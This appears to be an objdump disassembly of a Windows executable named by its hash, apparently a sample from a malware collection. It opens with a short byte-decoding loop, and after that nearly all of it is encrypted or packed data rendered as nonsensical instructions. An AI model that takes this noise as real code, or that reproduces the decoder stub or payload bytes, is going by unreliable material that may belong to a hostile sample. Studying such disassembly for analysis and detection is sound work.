
1ac584fb9c6d05e5f204eaff06a22f15b773ce81a3d517a9d4f165311c1b9615.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	push   ecx
  411001:	push   ebp
  411002:	mov    ebp,DWORD PTR [esp+0x10]
  411006:	xor    eax,eax
  411008:	test   ebp,ebp
  41100a:	push   esi
  41100b:	mov    DWORD PTR [esp+0x8],eax
  41100f:	mov    esi,0xfffffffd
  411014:	je     0x41107a
  411016:	push   ebx
  411017:	push   edi
  411018:	mov    edi,DWORD PTR [esp+0x18]
  41101c:	mov    DWORD PTR [esp+0x1c],0x1
  411024:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  411028:	add    esi,0x2
  41102b:	inc    esi
  41102c:	mov    BYTE PTR [esi+edi*1],cl
  41102f:	mov    ecx,DWORD PTR [esp+0x24]
  411033:	movzx  ecx,BYTE PTR [eax+ecx*1]
  411037:	mov    edx,DWORD PTR [esp+0x10]
  41103b:	mov    eax,DWORD PTR [esp+0x1c]
  41103f:	add    edx,eax
  411041:	mov    DWORD PTR [esp+0x10],edx
  411045:	ror    eax,cl
  411047:	mov    eax,DWORD PTR [esp+0x10]
  41104b:	mov    edx,eax
  41104d:	shr    edx,0x3
  411050:	mov    ebx,0x1
  411055:	sub    ebx,edx
  411057:	imul   eax,ebx
  41105a:	mov    DWORD PTR [esp+0x10],eax
  41105e:	shl    ebx,0x3
  411061:	mov    bl,BYTE PTR [esi+edi*1]
  411064:	add    bl,cl
  411066:	mov    ecx,DWORD PTR [esp+0x20]
  41106a:	mov    BYTE PTR [esi+edi*1],bl
  41106d:	sub    esi,0x2
  411070:	cmp    esi,ecx
  411072:	jl     0x411024
  411074:	pop    edi
  411075:	pop    ebx
  411076:	pop    esi
  411077:	pop    ebp
  411078:	pop    ecx
  411079:	ret    
  41107a:	aaa    
  41107b:	dec    ebp
  41107c:	xor    DWORD PTR [eax+eiz*4-0x2e],ebp
  411080:	test   eax,0xae82dd64
  411085:	(bad)  
  411086:	mov    DWORD PTR [edi+0x4ff8da2f],ebp
  41108c:	aam    0x8f
  41108e:	inc    esi
  41108f:	push   ds
  411090:	mov    ecx,ecx
  411092:	cli    
  411093:	dec    edx
  411094:	popf   
  411095:	popa   
  411096:	add    ah,bh
  411098:	push   ds
  411099:	and    DWORD PTR [edi-0x4b],0xffffff8b
  41109d:	paddusw mm1,mm5
  4110a0:	pushf  
  4110a1:	shl    esp,1
  4110a3:	dec    esp
  4110a4:	jbe    0x411072
  4110a6:	push   ecx
  4110a7:	sar    DWORD PTR [edi+0x48521eee],1
  4110ad:	cmp    dl,BYTE PTR [edx-0x19b9672e]
  4110b3:	outs   dx,DWORD PTR ds:[esi]
  4110b4:	adc    eax,0xb816402b
  4110b9:	xor    DWORD PTR [edx+0x5c22219e],ebp
  4110bf:	dec    esi
  4110c0:	jg     0x411057
  4110c2:	mov    al,0x7b
  4110c4:	dec    edx
  4110c5:	inc    esp
  4110c6:	add    BYTE PTR [esi-0xeb2a05d],bh
  4110cc:	mov    fs,WORD PTR [edi-0x44]
  4110cf:	mov    ds:0xdf0193c,eax
  4110d4:	call   0xca1b8e9
  4110d9:	or     dh,BYTE PTR [esi+eiz*1]
  4110dc:	dec    ebx
  4110dd:	mov    DWORD PTR [esi+esi*1-0x6fa98a3e],0xacf98ed5
  4110e8:	fcmovnb st,st(5)
  4110ea:	mov    edi,0x6e0627e0
  4110ef:	cmc    
  4110f0:	leave  
  4110f1:	bound  esi,QWORD PTR ds:0x3f27f079
  4110f7:	xchg   esp,eax
  4110f8:	es aad 0xb
  4110fb:	sub    bl,BYTE PTR [eax-0x3dc6494f]
  411101:	xor    eax,DWORD PTR cs:[edi+0x15]
  411105:	jno    0x4110c3
  411107:	cmp    DWORD PTR [ecx],edx
  411109:	mov    ds:0x3c1d7240,al
  41110e:	ss ins DWORD PTR es:[edi],dx
  411110:	xor    DWORD PTR [ebp+0x26e62a9e],0x7c
  411117:	mov    eax,0xcdf12765
  41111c:	add    BYTE PTR [edx],al
  41111e:	sahf   
  41111f:	or     BYTE PTR [ecx-0x7dfaa756],bh
  411125:	push   0x6d
  411127:	xor    BYTE PTR [ebx-0x47],bl
  41112a:	dec    esi
  41112b:	mov    esi,0x7fa3aea7
  411130:	jecxz  0x411160
  411132:	shr    DWORD PTR ds:0x3160832e,1
  411138:	in     eax,0x0
  41113a:	mov    WORD PTR [eax],es
  41113c:	jl     0x41115a
  41113e:	fsub   st(4),st
  411140:	repnz nop
  411142:	inc    ebx
  411143:	test   DWORD PTR [edi],0x2a5ab1fd
  411149:	cmp    DWORD PTR [esi],0x37ffedc1
  41114f:	or     al,0xb8
  411151:	inc    ebp
  411152:	test   al,0x96
  411154:	mov    al,ds:0xc553cd76
  411159:	test   eax,0xf2be01a9
  41115e:	xor    DWORD PTR [edi],esp
  411160:	clc    
  411161:	push   esp
  411162:	popa   
  411163:	dec    ebp
  411164:	iret   
  411165:	ins    BYTE PTR es:[edi],dx
  411166:	push   es
  411167:	lea    eax,[ebp+0x79]
  41116a:	jp     0x41118d
  41116c:	xchg   edi,eax
  41116d:	mov    ebx,0x905111eb
  411172:	rol    BYTE PTR [edi-0x5ae82ee8],1
  411178:	xchg   ecx,eax
  411179:	ss dec ebx
  41117b:	bound  edx,QWORD PTR [eax+0x31189a]
  411181:	cs mov edx,0xd1995048
  411187:	cmp    eax,0xe54fc824
  41118c:	std    
  41118d:	aaa    
  41118e:	out    dx,al
  41118f:	cli    
  411190:	mov    al,ds:0x14a40e88
  411195:	inc    ebx
  411197:	ds xchg edi,eax
  411199:	pop    eax
  41119a:	in     al,0x95
  41119c:	sahf   
  41119d:	imul   esi,DWORD PTR [ebp+0x36b7d86e],0x1
  4111a4:	es stos DWORD PTR es:[edi],eax
  4111a6:	mov    bh,0x21
  4111a8:	pop    ds
  4111a9:	cwde   
  4111aa:	xor    cl,BYTE PTR [esi-0x1ec48ef5]
  4111b0:	push   esp
  4111b1:	or     cl,BYTE PTR [eax]
  4111b3:	fdivr  DWORD PTR [edi+edi*4]
  4111b6:	mov    cl,BYTE PTR [ecx-0x6b183b27]
  4111bc:	mov    bh,BYTE PTR [eax]
  4111be:	pop    edi
  4111bf:	dec    esi
  4111c0:	retf   
  4111c1:	and    cl,bh
  4111c3:	or     DWORD PTR [ebp+0xd],eax
  4111c6:	imul   esi,edx,0x45
  4111c9:	mov    ebx,edi
  4111cb:	inc    ecx
  4111cc:	loop   0x4111a5
  4111ce:	sbb    eax,0xb4bd0e
  4111d3:	add    eax,0x1c040102
  4111d8:	rcl    DWORD PTR [ebp+0x1b4c5d06],cl
  4111de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4111df:	lods   al,BYTE PTR ds:[esi]
  4111e0:	in     eax,0x3d
  4111e2:	jae    0x411243
  4111e4:	into   
  4111e5:	sub    al,BYTE PTR [esi-0x3f]
  4111e8:	adc    al,0x3c
  4111ea:	jae    0x4111b7
  4111ec:	into   
  4111ed:	and    eax,0x59213fd8
  4111f2:	jno    0x4111ef
  4111f4:	pop    ebx
  4111f5:	lea    ebp,[esi+0x3]
  4111f8:	mov    esp,0x929ecbc6
  4111fd:	or     DWORD PTR [ecx+0x27],esp
  411200:	rcr    ch,0x49
  411203:	push   ebp
  411204:	mov    edi,gs
  411206:	fadd   DWORD PTR [ebp-0x7636bb0f]
  41120c:	pop    esi
  41120d:	sbb    dh,ch
  41120f:	outs   dx,DWORD PTR ds:[esi]
  411210:	mov    eax,ds:0x228c20ab
  411215:	cwde   
  411216:	add    DWORD PTR [edx],0xfebe0b5b
  41121c:	daa    
  41121d:	je     0x411208
  41121f:	xchg   ecx,eax
  411220:	test   ebp,esi
  411222:	or     al,0xec
  411224:	imul   esi,DWORD PTR [edi],0x74
  411227:	jns    0x411222
  411229:	inc    eax
  41122a:	fmul   QWORD PTR [ebp-0x6c]
  41122d:	push   edx
  41122e:	rcl    cl,0x65
  411231:	outs   dx,DWORD PTR ds:[esi]
  411232:	imul   edx,DWORD PTR [eax+0x2d],0x665f9db2
  411239:	(bad)  
  41123a:	push   edi
  41123b:	add    esi,DWORD PTR [ecx+0x59]
  41123e:	dec    eax
  41123f:	hlt    
  411240:	test   al,al
  411242:	inc    ecx
  411243:	sbb    eax,0x87ba368a
  411248:	jmp    0x411267
  41124a:	adc    BYTE PTR [ecx+0x5c],0xa0
  41124e:	adc    DWORD PTR fs:[edi-0xaed5d11],esp
  411255:	std    
  411256:	dec    edx
  411257:	cdq    
  411258:	mov    ds:0xf3570d00,al
  41125d:	pushf  
  41125e:	fwait
  41125f:	jbe    0x4112a4
  411261:	adc    DWORD PTR [ecx],edx
  411263:	pusha  
  411264:	pop    ss
  411265:	dec    ecx
  411266:	lods   eax,DWORD PTR ds:[esi]
  411267:	out    dx,al
  411268:	inc    eax
  411269:	mov    ds:0x7a3d428c,eax
  41126e:	shr    ecx,1
  411270:	cmp    eax,DWORD PTR [ebp-0x5a5b20d3]
  411276:	pop    esp
  411277:	fcomip st,st(0)
  411279:	call   0xdbbd:0x6c9cdfbb
  411280:	(bad)  
  411281:	out    dx,eax
  411282:	call   0xc20927e8
  411287:	mov    edi,0xdc716c90
  41128c:	call   0x8f668b6e
  411291:	es fucomi st,st(3)
  411294:	out    dx,al
  411295:	es xor ebp,0xce91e468
  41129c:	xchg   DWORD PTR [esi+0x11862325],ebp
  4112a2:	cwde   
  4112a3:	retf   0x4d
  4112a6:	inc    ebp
  4112a7:	mul    BYTE PTR [ebp-0x77]
  4112aa:	out    0x52,eax
  4112ac:	inc    edx
  4112ad:	cmova  ecx,DWORD PTR [eax+0x52]
  4112b1:	aad    0x4e
  4112b3:	push   es
  4112b4:	fnstenv [ebx-0x3759f65c]
  4112ba:	sub    al,0x8c
  4112bc:	sub    BYTE PTR [ecx],dl
  4112be:	xor    dh,dl
  4112c0:	or     dh,BYTE PTR [esi]
  4112c2:	mov    ah,0xee
  4112c4:	pop    ds
  4112c5:	lea    edi,[esp+ebp*1]
  4112c8:	stos   DWORD PTR es:[edi],eax
  4112c9:	mov    bh,0xbe
  4112cb:	mov    al,0xbe
  4112cd:	cli    
  4112ce:	sub    eax,0x3f3e5e39
  4112d3:	imul   ebp,DWORD PTR [ebp-0x7c],0x3b6a924a
  4112da:	lahf   
  4112db:	lods   al,BYTE PTR ds:[esi]
  4112dc:	js     0x411302
  4112de:	ret    0xca41
  4112e1:	in     al,0xf1
  4112e3:	or     BYTE PTR [ecx+eiz*1+0x22],dl
  4112e7:	inc    edx
  4112e8:	fs xchg esi,eax
  4112ea:	cld    
  4112eb:	pop    edx
  4112ec:	xchg   ebx,eax
  4112ed:	jne    0x411317
  4112ef:	(bad)  
  4112f0:	mov    esi,gs
  4112f2:	push   0xffffffe8
  4112f4:	outs   dx,DWORD PTR ds:[esi]
  4112f5:	(bad)  
  4112f6:	ss es mov eax,0x5c01522f
  4112fd:	mov    ah,0xa2
  4112ff:	loop   0x41136e
  411301:	lods   eax,DWORD PTR ds:[esi]
  411302:	xor    dl,ah
  411304:	dec    edx
  411305:	sar    DWORD PTR [edx+0x28],1
  411308:	cmp    DWORD PTR [eax+edi*1],0xffffffa2
  41130c:	push   DWORD PTR [ebp-0x1d1ade7]
  411312:	or     eax,0xae7a05a4
  411317:	sub    eax,0xe11a9238
  41131c:	mov    ds:0xa56b19d1,al
  411321:	push   0x36
  411323:	aam    0x68
  411325:	stos   DWORD PTR es:[edi],eax
  411326:	rcr    BYTE PTR [ebx],1
  411328:	and    DWORD PTR [eax+0x35d47ea4],ebx
  41132e:	add    ah,0x89
  411331:	pop    ds
  411332:	jo     0x41131b
  411334:	push   ds
  411335:	ins    BYTE PTR es:[edi],dx
  411336:	mov    ds:0x4fc812fe,al
  41133b:	sti    
  41133c:	out    dx,al
  41133d:	lods   eax,DWORD PTR ds:[esi]
  41133e:	shl    DWORD PTR [ecx+0x54e12cc],1
  411344:	push   edx
  411345:	lea    esp,[edi+0x2a]
  411348:	bound  edi,QWORD PTR [esi+edi*2-0x39ec05ed]
  41134f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411350:	mov    ecx,0x4177f1d6
  411355:	jmp    0xdee7:0x2e7c6977
  41135c:	xchg   DWORD PTR [ebx+0x3ba82898],eax
  411362:	xchg   BYTE PTR [edx-0xe8c32b9],dl
  411368:	pop    ebx
  411369:	outs   dx,BYTE PTR ds:[esi]
  41136a:	xor    esp,esi
  41136c:	repz add eax,0xdd5bc55a
  411372:	daa    
  411373:	ins    DWORD PTR es:[edi],dx
  411374:	xchg   BYTE PTR [eax-0x2eec17c1],ah
  41137a:	jmp    0xe730:0x36e44b0a
  411381:	cmc    
  411382:	aaa    
  411383:	fistp  QWORD PTR [esi]
  411385:	cwde   
  411386:	push   esi
  411387:	and    al,BYTE PTR [ebx]
  411389:	mov    al,0xb5
  41138b:	dec    esp
  41138c:	enter  0xdf7c,0x3d
  411390:	aas    
  411391:	xor    eax,0xd964cd1d
  411396:	aas    
  411397:	dec    ebp
  411398:	(bad)  
  411399:	aad    0xbc
  41139b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41139c:	cwde   
  41139d:	mov    ebx,0x1512e2a4
  4113a2:	lock pushf 
  4113a4:	dec    ecx
  4113a5:	fidiv  DWORD PTR [edx-0x6d172745]
  4113ab:	push   esi
  4113ac:	mov    eax,0xd3bb48e6
  4113b1:	dec    ebx
  4113b2:	sub    al,0x6b
  4113b4:	or     DWORD PTR [ecx+0x9],edi
  4113b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113b8:	enter  0xee3d,0x88
  4113bc:	jmp    0x270b:0xf4cbbaeb
  4113c3:	or     esi,DWORD PTR [edx-0x1f8538db]
  4113c9:	mov    ecx,0x65c5440d
  4113ce:	mov    ebx,0xc83ec46d
  4113d3:	adc    ebp,ecx
  4113d5:	and    BYTE PTR [edx+0x50],ah
  4113d8:	or     esi,DWORD PTR [ebx-0x19d85484]
  4113de:	mov    eax,0xbd414776
  4113e3:	push   edx
  4113e4:	pop    es
  4113e5:	xchg   dl,dh
  4113e7:	push   es
  4113e8:	cld    
  4113e9:	aas    
  4113ea:	jecxz  0x411425
  4113ec:	retf   
  4113ed:	sub    al,0x7b
  4113ef:	xchg   DWORD PTR [edi-0x49a3b5b],ebp
  4113f5:	loopne 0x411392
  4113f7:	adc    dh,bl
  4113f9:	das    
  4113fa:	addr16 pop esi
  4113fc:	dec    esp
  4113fd:	mov    esi,0xc6ae4be4
  411402:	test   BYTE PTR [edi-0x57e29139],bh
  411408:	mov    bl,BYTE PTR ds:0x3e581e1a
  41140e:	fsubr  st,st(4)
  411410:	in     eax,0xa1
  411412:	into   
  411413:	icebp  
  411414:	add    BYTE PTR [ecx],ch
  411416:	and    al,0x1c
  411418:	cli    
  411419:	(bad)  
  41141a:	(bad)  
  41141b:	loope  0x411497
  41141d:	aas    
  41141e:	lds    esp,FWORD PTR es:[edi]
  411421:	stc    
  411422:	inc    esp
  411423:	retf   
  411424:	mov    eax,ds:0x85db38a1
  411429:	push   edx
  41142a:	rcl    bh,1
  41142c:	loop   0x4114ad
  41142e:	ja     0x411427
  411430:	das    
  411431:	lock daa 
  411433:	cwde   
  411434:	inc    edi
  411435:	mov    esi,0xcb9b1ba5
  41143a:	dec    ebx
  41143b:	call   0xe213:0xca32a38a
  411442:	ror    DWORD PTR [ebp+0x76],cl
  411445:	cmp    ebx,DWORD PTR [edx-0x6]
  411448:	dec    ebx
  411449:	mov    al,ds:0xdf86da9d
  41144e:	mov    DWORD PTR [ebp-0x71],ebp
  411451:	test   DWORD PTR [ecx],esp
  411453:	call   0x6e5d1705
  411458:	retf   0xa3ab
  41145b:	ja     0x4114d2
  41145d:	push   edi
  41145e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41145f:	dec    eax
  411460:	adc    DWORD PTR [esi+0x22],ecx
  411463:	adc    ch,cl
  411465:	push   edi
  411466:	leave  
  411467:	jge    0x4113ea
  411469:	mov    dh,0x68
  41146b:	stos   DWORD PTR es:[edi],eax
  41146c:	fcmovb st,st(6)
  41146e:	pop    edx
  41146f:	or     DWORD PTR ds:0x94ab2a33,edi
  411475:	cdq    
  411476:	push   0x1f81237b
  41147b:	es in  eax,0xfd
  41147e:	push   edx
  41147f:	test   ch,ch
  411481:	dec    esp
  411482:	pop    ebx
  411483:	xchg   edx,eax
  411484:	loopne 0x411416
  411486:	stc    
  411487:	mov    dh,0xee
  411489:	add    BYTE PTR [ebp+0x5e],dh
  41148c:	hlt    
  41148d:	xchg   esi,eax
  41148e:	fwait
  41148f:	add    eax,0xedaeb74a
  411494:	pop    ecx
  411495:	scas   eax,DWORD PTR es:[edi]
  411496:	or     BYTE PTR [ecx-0x5efe1a52],dh
  41149c:	daa    
  41149d:	es cmc 
  41149f:	sbb    DWORD PTR [eax],edx
  4114a1:	pop    edi
  4114a2:	xchg   esi,eax
  4114a3:	mov    eax,0x8ac95fab
  4114a8:	mov    ah,0xbb
  4114aa:	pop    ebp
  4114ab:	or     ah,dl
  4114ad:	dec    edi
  4114ae:	add    ch,BYTE PTR [ecx-0x7b0ec6ba]
  4114b4:	call   0x7f36bbaf
  4114b9:	sub    ebp,ebp
  4114bb:	outs   dx,BYTE PTR ds:[esi]
  4114bc:	mov    edx,DWORD PTR [edx+0x164f0d4f]
  4114c2:	fcomp  QWORD PTR [si-0x3426]
  4114c7:	add    eax,0x413b08b2
  4114cc:	lahf   
  4114cd:	push   0xbb5366bb
  4114d2:	mov    ah,BYTE PTR [ecx+0x1807dcde]
  4114d8:	dec    esp
  4114d9:	popa   
  4114da:	jle    0x4114d2
  4114dc:	cmp    DWORD PTR [edi+0x34],edx
  4114df:	sub    edi,esp
  4114e1:	int3   
  4114e2:	fld    QWORD PTR [ebx-0xb970963]
  4114e8:	les    esp,FWORD PTR [edx+0x29]
  4114eb:	dec    edx
  4114ec:	(bad)  
  4114ed:	fwait
  4114ee:	in     al,0x35
  4114f0:	ss out 0xa2,al
  4114f3:	sub    al,0xe4
  4114f5:	leave  
  4114f6:	adc    DWORD PTR [ecx+0x32c48cbe],ecx
  4114fc:	sbb    BYTE PTR [eax],bh
  4114fe:	or     eax,ecx
  411500:	es jb  0x411542
  411503:	mov    eax,0xa9d47f16
  411508:	jnp    0x41152f
  41150a:	ret    
  41150b:	out    0x8a,al
  41150d:	inc    eax
  41150e:	inc    esp
  41150f:	push   edx
  411510:	and    BYTE PTR [ebp+0x45dae1d4],al
  411516:	add    DWORD PTR [esi+0x261092e2],esp
  41151c:	outs   dx,BYTE PTR ds:[esi]
  41151d:	sub    DWORD PTR [edi+0x16],0xbc69b5fb
  411524:	fwait
  411525:	xor    ebx,DWORD PTR [edi]
  411527:	cmp    esp,DWORD PTR [ebx-0x2c]
  41152a:	and    BYTE PTR [edx],0x9
  41152d:	cs cmp eax,0xfad6e7c5
  411533:	jns    0x4114c6
  411535:	fsubr  st(7),st
  411537:	inc    edx
  411538:	or     DWORD PTR [ecx-0x645b1702],edx
  41153e:	xchg   ecx,eax
  41153f:	stos   DWORD PTR es:[edi],eax
  411540:	sbb    al,0x97
  411542:	dec    edx
  411543:	xor    bh,cl
  411545:	addr16 mov cl,0x13
  411548:	enter  0xeb91,0x1b
  41154c:	dec    esp
  41154d:	add    dh,BYTE PTR [ebx+0x13]
  411550:	inc    ebx
  411551:	push   es
  411552:	nop
  411553:	sub    al,BYTE PTR [esi+eax*1]
  411556:	cmp    al,0xc8
  411558:	jg     0x411556
  41155a:	inc    esp
  41155b:	mov    al,ds:0x63b2b32f
  411560:	sub    ebp,ebp
  411562:	popa   
  411563:	mov    ch,0x8a
  411565:	lds    ebx,FWORD PTR [edx+0x6dd05cc0]
  41156b:	adc    eax,0xce45137b
  411570:	add    DWORD PTR ss:[eax-0x3ab6fa35],ecx
  411577:	cdq    
  411578:	sbb    BYTE PTR [edi-0x73],bl
  41157b:	scas   al,BYTE PTR es:[edi]
  41157c:	inc    esi
  41157d:	loop   0x4115fa
  41157f:	cmp    eax,DWORD PTR [ecx+0x194afb5c]
  411585:	adc    DWORD PTR [edx],esi
  411587:	scas   al,BYTE PTR es:[edi]
  411588:	sbb    DWORD PTR [edi],ebp
  41158a:	sub    DWORD PTR [ebx+0x376e7bd6],ecx
  411590:	mov    DWORD PTR [edi+edx*1+0x61],esp
  411594:	xor    DWORD PTR [esi+0x30],edx
  411597:	pop    edx
  411598:	gs xchg ebp,eax
  41159a:	cmp    BYTE PTR [ecx-0x6c],al
  41159d:	int3   
  41159e:	arpl   WORD PTR [edi-0x39],ax
  4115a1:	rcl    BYTE PTR [edx-0x294a5400],cl
  4115a7:	rcr    cl,1
  4115a9:	xor    dl,BYTE PTR [ecx-0x411c5c12]
  4115af:	fwait
  4115b0:	pop    eax
  4115b1:	ret    
  4115b2:	inc    ecx
  4115b3:	sbb    eax,0xd9528f1d
  4115b8:	out    0x0,eax
  4115ba:	push   ecx
  4115bb:	sbb    DWORD PTR [edi],esp
  4115bd:	xor    eax,0x2bb5b26e
  4115c2:	push   esp
  4115c3:	adc    ebp,DWORD PTR [esi]
  4115c5:	das    
  4115c6:	retf   
  4115c7:	mov    eax,ds:0x8e6db2b6
  4115cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4115cd:	ds push ebp
  4115cf:	mov    ds:0xb65ded59,eax
  4115d4:	inc    edi
  4115d5:	ret    
  4115d6:	ja     0x411628
  4115d8:	sahf   
  4115d9:	add    DWORD PTR [edi+0x552a6255],edx
  4115df:	mov    ebx,edx
  4115e1:	cwde   
  4115e2:	xor    dl,BYTE PTR [esi]
  4115e4:	pushf  
  4115e5:	xor    BYTE PTR [ebp+0x3c6588b3],cl
  4115eb:	xchg   edi,eax
  4115ec:	pop    esi
  4115ed:	bsr    edi,edi
  4115f0:	sbb    ebp,DWORD PTR [ebp-0x1c5e80d6]
  4115f6:	fidiv  WORD PTR [ebx-0x1f6a12bb]
  4115fc:	jmp    0x411667
  4115fe:	iret   
  4115ff:	(bad)  
  411600:	pop    esp
  411601:	xchg   edi,eax
  411602:	fistp  QWORD PTR [edx+0x6592528a]
  411608:	outs   dx,DWORD PTR ds:[esi]
  411609:	dec    esi
  41160a:	call   0x8516:0xa4dcc2d
  411611:	xchg   esp,eax
  411612:	test   BYTE PTR [edi-0x58231e43],al
  411618:	dec    edi
  411619:	mov    ?,esi
  41161b:	shl    BYTE PTR [ecx-0x4b],0x19
  41161f:	dec    esp
  411620:	cdq    
  411621:	sbb    al,0xd6
  411623:	pop    es
  411624:	pop    eax
  411625:	hlt    
  411626:	or     esi,DWORD PTR [ebp+0x1156371b]
  41162c:	and    BYTE PTR ds:0x613e3b76,ah
  411632:	fist   WORD PTR [esi-0x7e54f2b]
  411638:	test   al,0xed
  41163a:	cmp    ah,bh
  41163c:	xchg   DWORD PTR [esp+edi*4+0x4441d55f],eax
  411643:	rol    DWORD PTR [esp+ebp*8-0xe],1
  411647:	sbb    DWORD PTR [ebx],esp
  411649:	clc    
  41164a:	push   ds
  41164b:	cld    
  41164c:	call   0x9860c965
  411651:	xor    eax,0xe4506c46
  411656:	sub    BYTE PTR [esi],0xb7
  411659:	icebp  
  41165a:	mov    bh,0x9c
  41165c:	fstp   st(7)
  41165e:	adc    BYTE PTR [esi-0x1b857c56],dl
  411664:	shl    ebp,cl
  411666:	repnz dec eax
  411668:	idiv   BYTE PTR [edi]
  41166a:	in     al,dx
  41166b:	push   0xcc40808d
  411670:	adc    BYTE PTR [esi],dl
  411672:	jmp    0x9fb7:0xf1bbb06b
  411679:	(bad)  
  41167a:	in     al,0xee
  41167c:	mov    eax,ds:0xeb8f6411
  411681:	lods   eax,DWORD PTR ds:[esi]
  411682:	mov    ebp,0x9425a49e
  411687:	lods   eax,DWORD PTR ds:[esi]
  411688:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411689:	lods   eax,DWORD PTR ds:[esi]
  41168a:	mov    DWORD PTR [edi-0x45cd8959],edx
  411690:	jb     0x4116aa
  411692:	shl    DWORD PTR [ebx+eax*2+0x3885880c],0x74
  41169a:	add    BYTE PTR [ecx],bh
  41169c:	rol    esp,cl
  41169e:	sub    eax,0x509f54e1
  4116a3:	int3   
  4116a4:	int3   
  4116a5:	mov    DWORD PTR [ebp+0x750fd5d],edx
  4116ab:	bound  eax,QWORD PTR [ebx+0x7c41f934]
  4116b1:	stc    
  4116b2:	repnz dec DWORD PTR [edi+0x74d2c18f]
  4116b9:	add    edx,DWORD PTR [eax]
  4116bb:	mov    ebx,0x4be0a2a7
  4116c0:	add    al,0xfc
  4116c2:	enter  0x20a6,0xdb
  4116c6:	fild   DWORD PTR [esi]
  4116c8:	sbb    al,0x65
  4116ca:	cld    
  4116cb:	aas    
  4116cc:	or     al,0xfd
  4116ce:	sti    
  4116cf:	pop    ss
  4116d0:	lods   eax,DWORD PTR ds:[esi]
  4116d1:	fsub   QWORD PTR [edi+ecx*8+0xfb6e94d]
  4116d8:	addr16 mov ah,0xcf
  4116db:	dec    esi
  4116dc:	pushw  cs
  4116de:	(bad)  
  4116df:	iret   
  4116e0:	icebp  
  4116e1:	xor    dl,BYTE PTR [esi-0x24b8fc58]
  4116e7:	ret    0x9473
  4116ea:	ins    BYTE PTR es:[edi],dx
  4116eb:	sub    BYTE PTR [ecx],dl
  4116ed:	cwde   
  4116ee:	push   0xb0ceb75d
  4116f3:	cmp    DWORD PTR [ebp+0x43bdc794],edx
  4116f9:	stos   BYTE PTR es:[edi],al
  4116fa:	fwait
  4116fb:	xor    DWORD PTR [edx+0x64],ecx
  4116fe:	cmp    ah,al
  411700:	mov    ds:0x6efc156,al
  411705:	lahf   
  411706:	outs   dx,DWORD PTR ds:[esi]
  411707:	mov    eax,esi
  411709:	popf   
  41170a:	fstp   DWORD PTR [esi-0x29]
  41170d:	jo     0x4116e7
  41170f:	test   BYTE PTR [ebx+0x35],ch
  411712:	jle    0x411759
  411714:	lods   eax,DWORD PTR ds:[esi]
  411715:	add    DWORD PTR [ebx+0x7f399422],edx
  41171b:	mov    edx,0x46a8965d
  411720:	stc    
  411721:	addr16 out dx,eax
  411723:	pop    es
  411724:	jo     0x41170c
  411726:	rol    BYTE PTR [ebp-0x26],1
  411729:	push   edi
  41172a:	idiv   esi
  41172c:	addr16 ret 0x2b2e
  411730:	es ret 0x4e2e
  411734:	stc    
  411735:	out    dx,eax
  411736:	mov    al,ds:0x6c086e88
  41173b:	mov    eax,ds:0xd45df155
  411740:	jno    0x411702
  411742:	sub    eax,0x3a7f7495
  411747:	inc    eax
  411748:	mov    bl,0xed
  41174a:	mov    ebp,0xbc18bdb5
  41174f:	lahf   
  411750:	push   es
  411751:	loopne 0x41173d
  411753:	imul   DWORD PTR [eax+0x44d0c9d5]
  411759:	pop    eax
  41175a:	mov    cl,0x43
  41175c:	imul   ax,WORD PTR [edi],0x4e05
  411761:	cmc    
  411762:	loope  0x4116ff
  411764:	test   al,0x73
  411766:	pop    edi
  411767:	ret    
  411768:	sub    BYTE PTR [edx+0x6],dl
  41176b:	sbb    DWORD PTR [eax-0x32],eax
  41176e:	jp     0x41177e
  411770:	repz into 
  411772:	call   0x6332:0x4d168ad
  411779:	js     0xba8ea164
  41177f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411780:	out    0x9f,al
  411782:	dec    esi
  411783:	sbb    edx,DWORD PTR [esi+0x408cdf67]
  411789:	pop    esp
  41178a:	jae    0x4117d3
  41178c:	mov    BYTE PTR [ebp-0x20fe0b7d],ch
  411792:	mov    cl,0xb7
  411794:	mov    ebx,0xf530c380
  411799:	outs   dx,DWORD PTR ds:[esi]
  41179a:	xchg   edi,eax
  41179b:	cmp    DWORD PTR [ebx-0x42a4bfc7],ebx
  4117a1:	enter  0xd63b,0x65
  4117a5:	sbb    esi,ebp
  4117a7:	xchg   esi,eax
  4117a8:	das    
  4117a9:	mov    eax,ds:0x22476d78
  4117ae:	cmp    esi,DWORD PTR [eax-0x3f]
  4117b1:	or     esp,edi
  4117b3:	xchg   edi,eax
  4117b4:	sub    al,0x34
  4117b6:	mov    WORD PTR [edx-0x65],cs
  4117b9:	pop    es
  4117ba:	ins    DWORD PTR es:[edi],dx
  4117bb:	out    0x13,eax
  4117bd:	mov    bh,0x67
  4117bf:	das    
  4117c0:	xchg   ebp,eax
  4117c1:	test   BYTE PTR [edi+0x6d2f846b],cl
  4117c7:	and    eax,0xd732286d
  4117cc:	pop    edi
  4117cd:	add    eax,DWORD PTR [eax]
  4117cf:	mov    ds:0x15e4bb44,al
  4117d4:	or     ecx,edx
  4117d6:	cld    
  4117d7:	mov    bl,0xe5
  4117d9:	fimul  WORD PTR [esp+ebp*2+0x20]
  4117dd:	mov    esp,DWORD PTR [esi+0x29e58f22]
  4117e3:	daa    
  4117e4:	cld    
  4117e5:	pop    ebp
  4117e6:	scas   eax,DWORD PTR es:[edi]
  4117e7:	push   ds
  4117e8:	xchg   esp,eax
  4117e9:	add    eax,0x3ded2cb7
  4117ee:	jmp    0x411818
  4117f0:	jno    0x41183f
  4117f2:	ja     0x41182d
  4117f4:	jp     0x41178b
  4117f6:	out    0xcd,al
  4117f8:	std    
  4117f9:	ret    
  4117fa:	pop    ebx
  4117fb:	mov    ebx,0xf22125f4
  411800:	jmp    0x96a1:0xcfb01360
  411807:	mov    ebp,0x233acbfe
  41180c:	inc    eax
  41180d:	aas    
  41180e:	aas    
  41180f:	mov    ecx,0x854e57f7
  411814:	gs mov ch,0x77
  411817:	jo     0x411845
  411819:	push   es
  41181a:	xchg   ecx,eax
  41181b:	loopne 0x4117cb
  41181d:	add    bh,BYTE PTR [eax+edi*4+0x4746da6a]
  411824:	pop    edx
